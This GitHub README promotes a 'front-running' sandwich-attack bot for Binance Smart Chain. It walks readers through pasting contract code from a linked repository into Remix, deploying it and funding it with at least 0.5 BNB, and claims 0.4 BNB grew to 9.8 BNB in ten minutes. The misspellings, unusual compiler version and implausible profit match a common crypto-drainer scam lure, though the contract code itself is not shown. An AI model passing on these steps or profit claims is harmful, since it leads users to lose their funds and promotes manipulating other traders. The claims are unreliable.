# frond-running-bot

Automation sandwich attack bot, Automation trending contract

NOTE: I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower. Gas fees average 0.006*2 (0.012 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.5BNB. Most tokens these days have some burn. Less than 0.5BNB doesn't give you much to work with.

NOTE: Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit.  The remaining pool keeps front running for profit, until you transaction "Action" function in Remix

1.Access Remix online IDE
![image](https://user-images.githubusercontent.com/94510580/142139206-96832a32-f5cb-4c43-a8f2-016de87d7a3b.png)

2.Create a file as bot.sol
![image](https://user-images.githubusercontent.com/94510580/142139310-43ea37c4-74ca-4aeb-89f4-ebda1c5d4082.png)

3.Paste https://github.com/ceyptobot/frond-running-bot/blob/main/FrontRunComplete code
![image](https://user-images.githubusercontent.com/94510580/142139463-ac3a7df0-68cf-4d2f-996c-88db481ec147.png)

4.Change to SOLIDITY COMPILER page ,select COMPILER with 0.606+commit and click compile bot.sol
![image](https://user-images.githubusercontent.com/94510580/142139585-f4583faf-4dc9-48f2-92e6-05643f1c0e2f.png)

5.Change to DEPLOY & RUN TRANSACTIONS page, connected your wallet and select injected Web3 and click Deploy button
![image](https://user-images.githubusercontent.com/94510580/142140125-159bc70d-65e4-46e3-825f-31dea91c9592.png)

6.Now your can see your contract at BSCSCAN
![image](https://user-images.githubusercontent.com/94510580/142140522-cb109026-e8e7-4467-80b7-1c72e8f074da.png)
Paste to https://bscscan.com/ and see it

7.Send least 0.5 BNB to your contract
![image](https://user-images.githubusercontent.com/94510580/142140702-bbb0f8f2-b7c5-4ec9-8bbc-7547ead0a35c.png)

8.Waiting some time and you can earn more BNB

9.Click action button, and see your earned BNB, I send 0.4 BNB to contract, after ten mins got 9.8 BNB
![image](https://user-images.githubusercontent.com/94510580/142140976-c9d4235a-0a19-4fc1-8da1-579c1654bb71.png)

